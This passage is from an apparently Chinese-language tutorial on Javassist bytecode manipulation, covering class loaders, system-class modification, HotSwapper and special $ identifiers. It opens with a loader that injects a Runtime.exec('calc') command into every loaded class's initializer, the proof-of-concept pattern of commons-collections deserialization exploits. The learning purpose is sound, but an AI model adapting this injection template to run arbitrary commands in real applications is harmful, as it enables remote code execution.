<span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(name);</span><br><span class="line">            <span class="comment">// 在这里可以自己自定义去动态修改一些内容</span></span><br><span class="line">            <span class="comment">// 比如像 CC 中常见的那样插入一个弹计算器方法，这样每个使用该加载器加载的类都会弹计算器</span></span><br><span class="line">            pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;%s\&quot;);&quot;</span>;</span><br><span class="line">            cmd = String.format(cmd, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">            cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line"><span class="comment">//            cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span></span><br><span class="line">            <span class="type">byte</span>[] b = cc.toBytecode();</span><br><span class="line">            <span class="keyword">return</span> defineClass(name, b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotFoundException | IOException | CannotCompileException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>G2_TestApp.java</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">G2_TestApp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">G2_TestApp</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello, koishi and shruti!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>G2_TestApp 类是一个应用程序。 要执行此程序，首先将类文件放在 .&#x2F;g2_classes 目录下，它目录不能是程序的 class 输出位置，否则 JVM 会用默认的类加载器去加载该类，它是我们自定义的 G2_SelfClassLoader_Learn 的父加载器。目录名 .&#x2F;g2_classes 由构造函数中的 insertClassPath() 指定。然后运行，则其会去执行 G2_TestApp 的 main 方法。此外，在 defineclass 方法中，还可以使用 javassist 去动态的修改字节码。</p>
<h3 id="修改系统的类"><a href="#修改系统的类" class="headerlink" title="修改系统的类"></a>修改系统的类</h3><p>像 java.lang.String 这样的系统类只能被系统类加载器加载。因此，上面的 SampleLoader 或 javassist.Loader 在加载时不能修改系统类。系统类必须被静态地修改。下面的程序向 java.lang.String 添加一个新字段 hiddenValue</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtField;</span><br><span class="line"><span class="keyword">import</span> javassist.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">G3_JavaOriginClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">        <span class="type">CtField</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(CtClass.intType, <span class="string">&quot;hiddenValue&quot;</span>, cc);</span><br><span class="line">        f.setModifiers(Modifier.PUBLIC);</span><br><span class="line">        cc.addField(f);</span><br><span class="line">        cc.writeFile(<span class="string">&quot;src/main/java&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>再创建一个测试类：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">G3_TestApp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        System.out.println(String.class.getField(<span class="string">&quot;hiddenValue&quot;</span>).getName());</span><br><span class="line">        <span class="comment">// javac G3_TestApp</span></span><br><span class="line">        <span class="comment">// java -Xbootclasspath/p:. G3_TestApp</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>运行测试类时通过 -Xbootclasspath&#x2F;p 去指定引导类路径，使其能够加载到我们改好的 String 方法。</p>
<p> 使用此技术来覆盖 rt.jar 中的系统类，则不需要再去手动修改。</p>
<h3 id="在运行时重新加载类"><a href="#在运行时重新加载类" class="headerlink" title="在运行时重新加载类"></a>在运行时重新加载类</h3><p>如果 JVM 在启用 JPDA 的情况下启动，那么使用 HotSwapper 可以动态地重新加载其他类。</p>
<p>启动HotSwapperTest 的 VM options 添加如下配置项</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000</span><br></pre></td></tr></table></figure></div>

<p>此外，HotSwapper 运行需要 tools.jar</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">scope</span>&gt;</span>system<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">systemPath</span>&gt;</span>$&#123;java.home&#125;/../lib/tools.jar<span class="tag">&lt;/<span class="name">systemPath</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>测试类如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"><span class="keyword">import</span> javassist.util.HotSwapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">G4_HotSwapper</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;whoami???&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 创建线程循环调用Person类的 say 方法 */</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">                person.say();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Javassist 运行时修改 Person 类的 say 方法 */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(person.getClass().getName());</span><br><span class="line"></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;say&quot;</span>);</span><br><span class="line">        ctMethod.setBody(<span class="string">&quot;System.out.println(\&quot;Oh, I&#x27;m Ko1sh1!\&quot;);&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * HotSwapper热修改Person类，需要开启 JPDA，监听 8000 端口</span></span><br><span class="line"><span class="comment">         * java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">HotSwapper</span> <span class="variable">hs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwapper</span>(<span class="number">8000</span>);</span><br><span class="line">        hs.reload(person.getClass().getName(), ctClass.toBytecode());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>结果如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami???</span><br><span class="line">whoami???</span><br><span class="line">whoami???</span><br><span class="line">whoami???</span><br><span class="line">Oh, I&#x27;m Ko1sh1!</span><br><span class="line">Oh, I&#x27;m Ko1sh1!</span><br><span class="line">Oh, I&#x27;m Ko1sh1!</span><br></pre></td></tr></table></figure></div>

<p>可以发现成功修改了其内容</p>
<h2 id="CtMethod-与-CtConstructor-使用"><a href="#CtMethod-与-CtConstructor-使用" class="headerlink" title="CtMethod 与 CtConstructor 使用"></a>CtMethod 与 CtConstructor 使用</h2><p>CtMethod 可以理解成加强版的<code>Method</code>对象。</p>
<p>获得方法：<code>CtMethod m = cc.getDeclaredMethod(MethodName)</code>。</p>
<p>这个类提供了方法 <code>setBody</code> ，<code>insertBefore</code> ，<code>insertAfter</code>， <code>insertAt</code> 等方法，使我们可以便捷的修改方法体。</p>
<h3 id="在方法体的开始-结尾处添加代码"><a href="#在方法体的开始-结尾处添加代码" class="headerlink" title="在方法体的开始&#x2F;结尾处添加代码"></a>在方法体的开始&#x2F;结尾处添加代码</h3><p>CtMethod 和 CtConstructor 提供了 insertBefore()，insertAfter() 和 addCatch() 方法。 它们可以将用 Java 编写的代码片段插入到现有方法中。Javassist 包括一个用于处理源代码的简单编译器，它接收用 Java 编写的源代码，并将其编译成 Java 字节码，并内联方法体中。还可以向 CtMethod 和 CtConstructor 中的 insertAt() 方法提供源代码和原始类定义中的源文件的行号，就可以将编译后的代码插入到指定行号位置。</p>
<p>方法 insertBefore() ，insertAfter()，addCatch() 和 insertAt() 接收一个表示语句或语句块的 String 对象。一个语句是一个单一的控制结构，比如 if 和 while 或者以分号结尾的表达式。语句块是一组用大括号 {} 包围的语句。因此，以下每行都是有效语句或块的示例：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">&#123; System.out.println(<span class="string">&quot;Hello&quot;</span>); &#125;</span><br><span class="line"><span class="keyword">if</span> (i &lt; <span class="number">0</span>) &#123; i = -i; &#125;</span><br></pre></td></tr></table></figure></div>



<p>此外，编译器支持语言扩展，以 $ 开头的几个标识符有特殊的含义：</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>$0</code>, <code>$1</code>, <code>$2</code>, …</td>
<td><code>$0 = this; $1 = args[0] .....</code> （如果方法是静态的，则 0 不可用）</td>
</tr>
<tr>
<td><code>$args</code></td>
<td>方法参数数组。它的类型为 <code>Object[]</code></td>
</tr>
<tr>
<td><code>$$</code></td>
<td>所有实参。例如, <code>m($$)</code> 等价于 <code>m($1,$2,</code>…<code>)</code></td>
</tr>
<tr>
<td><code>$cflow(</code>…<code>)</code></td>
<td><code>cflow</code> 变量</td>
</tr>
<tr>
<td><code>$r</code></td>
<td>返回结果的类型，用于强制类型转换</td>
</tr>
<tr>
<td><code>$w</code></td>
<td>包装器类型，用于强制类型转换</td>
</tr>
<tr>
<td><code>$_</code></td>
<td>返回值</td>
</tr>
<tr>
<td><code>$sig</code></td>
<td>类型为 java.lang.Class 的参数类型数组</td>
</tr>
<tr>
<td><code>$type</code></td>
<td>一个 java.lang.Class 对象，表示返回值类型</td>
</tr>
<tr>
<td><code>$class</code></td>
<td>一个 java.lang.Class 对象，表示当前正在修改的类</td>
</tr>
</tbody></table>
<h4 id="0-1-2"><a href="#0-1-2" class="headerlink" title="$0, $1, $2"></a><code>$0</code>, <code>$1</code>, <code>$2</code></h4><p>写个测试类简单看看这三个值的用法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">G5_CtMethod_Learn</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">        <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>&#123;</span><br><span class="line">            System.out.println(a + b);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;G5_CtMethod_Learn$Test&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> cc.getDeclaredMethod(<span class="string">&quot;add&quot;</span>);</span><br><span class="line">        m.insertBefore(<span class="string">&quot;&#123; System.out.println($0.getClass().getName());System.out.println(\&quot;first num:\&quot;+$1);\nSystem.out.println(\&quot;second num:\&quot;+$2);&#125;&quot;</span>);</span><br><span class="line">        cc.writeFile(<span class="string">&quot;javassist_learn/src/main/java/class_repository&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = cc.toClass();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> aClass.newInstance();</span><br><span class="line">        aClass.getDeclaredMethod(<span class="string">&quot;add&quot;</span>, <span class="type">int</span>.class, <span class="type">int</span>.class).invoke(instance, <span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>Test 类的字节变为下面这样</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">G5_CtMethod_Learn$Test</span> &#123;</span><br><span class="line">    G5_CtMethod_Learn$Test() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;first num:&quot;</span> + a);</span><br><span class="line">        System.out.println(<span class="string">&quot;second num:&quot;</span> + b);</span><br><span class="line">        System.out.println(a + b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="args"><a href="#args" class="headerlink" title="$args"></a>$args</h4><p>方法参数数组。它的类型为 <code>Object[]</code>，如果参数类型是基本数据类型（int，char等），则该参数值将转换为包装器对象（如 java.lang.Integer）存在 args 中。当第一个数据类型不是基本数据类型时，args[0] 即为 $1（不是 $0，因为 $0 是 this）</p>
<p>此外，javassist 不会进行装包和拆包，Integer 数据类型不能直接进行四则运算。</p>
<p>我们将之前的代码改为如下</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;G5_CtMethod_Learn$Test&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> cc.getDeclaredMethod(<span class="string">&quot;add&quot;</span>);</span><br><span class="line"><span class="comment">//        m.insertBefore(&quot;&#123; System.out.println($0.getClass().getName());System.out.println(\&quot;first num:\&quot;+$1);\nSystem.out.println(\&quot;second num:\&quot;+$2);&#125;&quot;);</span></span><br><span class="line">        m.insertBefore(<span class="string">&quot;&#123; System.out.println(java.util.Arrays.toString($args));\nSystem.out.println($args[0]+$args[1]);&#125;&quot;</span>);</span><br><span class="line">        cc.writeFile(<span class="string">&quot;javassist_learn/src/main/java/class_repository&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = cc.toClass();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> aClass.newInstance();</span><br><span class="line">        aClass.getDeclaredMethod(<span class="string">&quot;add&quot;</span>, <span class="type">int</span>.class, <span class="type">int</span>.class).invoke(instance, <span class="number">10</span>, <span class="number">20</span>);</span><br></pre></td></tr></table></figure></div>

<p>生成的代码为：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        System.out.println(Arrays.toString(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Integer</span>(a), <span class="keyword">new</span> <span class="title class_">Integer</span>(b)&#125;));</span><br><span class="line">        System.out.println(String.valueOf((<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Integer</span>(a), <span class="keyword">new</span> <span class="title class_">Integer</span>(b)&#125;)[<span class="number">0</span>]).concat(String.valueOf((<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Integer</span>(a), <span class="keyword">new</span> <span class="title class_">Integer</span>(b)&#125;)[<span class="number">1</span>])));</span><br><span class="line">        System.out.println(a + b);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>我们可以发现，首先 int 这种基本数据类型确实转换为了包装类，此外，当我们对 Integer 对象进行 <code>+</code> 运算时，转换的字节码则是转化为了字符串拼接，而不是整数的加运算。</p>
<h4 id="，-proceed"><a href="#，-proceed" class="headerlink" title="$$，$proceed"></a>$$，$proceed</h4><p>变量 $$ 是所有参数列表的缩写，用逗号分隔。</p>
<p>将之前的代码改为如下</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">G5_CtMethod_Learn</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">        <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>&#123;</span><br><span class="line">            System.out.println(a + b);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">void</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>&#123;</span><br><span class="line">            System.out.println(Math.abs(a-b));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;G5_CtMethod_Learn$Test&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> cc.getDeclaredMethod(<span class="string">&quot;add&quot;</span>);</span><br><span class="line">        m.insertBefore(<span class="string">&quot;&#123; sub($$);&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        cc.writeFile(<span class="string">&quot;javassist_learn/src/main/java/class_repository&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = cc.toClass();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> aClass.newInstance();</span><br><span class="line">        aClass.getDeclaredMethod(<span class="string">&quot;add&quot;</span>, <span class="type">int</span>.class, <span class="type">int</span>.class).invoke(instance, <span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>生成的 class 文件内容如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">G5_CtMethod_Learn$Test</span> &#123;</span><br><span class="line">    G5_CtMethod_Learn$Test() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.sub(a, b);</span><br><span class="line">        System.out.println(a + b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        System.out.println(Math.abs(a - b));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以与其他方法一起使用。</p>
<p>假如写：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">exFunc($$, context)</span><br></pre></td></tr></table></figure></div>

<p>等价于（由于 add 函数只有两个参数，所以 $$ 也只会生成两个，根据调用的函数参数数量确定）</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">exFunc($<span class="number">1</span>, $<span class="number">2</span>, context)</span><br></pre></td></tr></table></figure></div>



<p>$proceed 表示的是调用原始方法，可以配合 $$ 表示原本方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">$proceed($$)</span><br></pre></td></tr></table></figure></div>



<h4 id="cflow"><a href="#cflow" class="headerlink" title="$cflow"></a>$cflow</h4><p><code>$cflow</code> 表示控制流。该变量是只读变量，会返回特定方法的递归调用的深度。</p>
<p>调用 $cflow 监视 fact() 方法的调用：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;G5_CtMethod_Learn$Test&quot;</span>);</span><br><span class="line"><span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> cc.getDeclaredMethod(<span class="string">&quot;fact&quot;</span>);</span><br><span class="line">m.useCflow(<span class="string">&quot;fact&quot;</span>);</span><br><span class="line">m.insertBefore(<span class="string">&quot;&#123; System.out.println(\&quot;函数递归深度：\&quot;+$cflow(fact));&#125;&quot;</span>);</span><br><span class="line">cc.writeFile(<span class="string">&quot;javassist_learn/src/main/java/class_repository&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Class&lt;?&gt; aClass = cc.toClass();</span><br><span class="line"><span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> aClass.newInstance();</span><br><span class="line">aClass.getDeclaredMethod(<span class="string">&quot;fact&quot;</span>,<span class="type">int</span>.class).invoke(instance,<span class="number">5</span>);</span><br></pre></td></tr></table></figure></div>

<p>为 Test 新建一个循环函数</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fact</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> n * fact(n - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>运行输出中看到：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">函数递归深度：0</span><br><span class="line">函数递归深度：1</span><br><span class="line">函数递归深度：2</span><br><span class="line">函数递归深度：3</span><br><span class="line">函数递归深度：4</span><br></pre></td></tr></table></figure></div>

<h4 id="r，"><a href="#r，" class="headerlink" title="$r，$_"></a>$r，$_</h4><p><code>$r</code> 函数的返回值类型</p>
<p><code>$_</code> 返回值</p>
<p><code>$_</code> 用于在 CtMethod 中的 insertAfter() 和 CtConstructor() 在方法的末尾插入编译的代码（insertBefore 等函数使用会产生报错），支持使用 <code>$1</code>,<code>$2</code>,<code>$_</code>等内容。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">      <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;G5_CtMethod_Learn$Test&quot;</span>);</span><br><span class="line">      <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span>  cc.getDeclaredMethod(<span class="string">&quot;word&quot;</span>);</span><br><span class="line">      m.insertAfter(<span class="string">&quot;&#123;Object result = \&quot;hahaha\&quot;;$_=($r)result;&#125;&quot;</span>);</span><br><span class="line">      cc.writeFile(<span class="string">&quot;javassist_learn/src/main/java/class_repository&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      Class&lt;?&gt; aClass = cc.toClass();</span><br><span class="line">      <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> aClass.newInstance();</span><br><span class="line">      System.out.println(aClass.getDeclaredMethod(<span class="string">&quot;word&quot;</span>).invoke(instance));</span><br></pre></td></tr></table></figure></div>

<p>word函数</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">String <span class="title function_">word</span><span class="params">()</span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></div>

<p>运行后输出，发现能成功改变</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">hahaha</span><br></pre></td></tr></table></figure></div>



<h4 id="w"><a href="#w" class="headerlink" title="$w"></a>$w</h4><p>自动转换为对应的包装器类型，用于强制类型转换。当存在如下代码时</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> ($w)<span class="number">5</span>;</span><br></pre></td></tr></table></figure></div>

<p>写入的class内容为：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">5</span>);</span><br></pre></td></tr></table></figure></div>



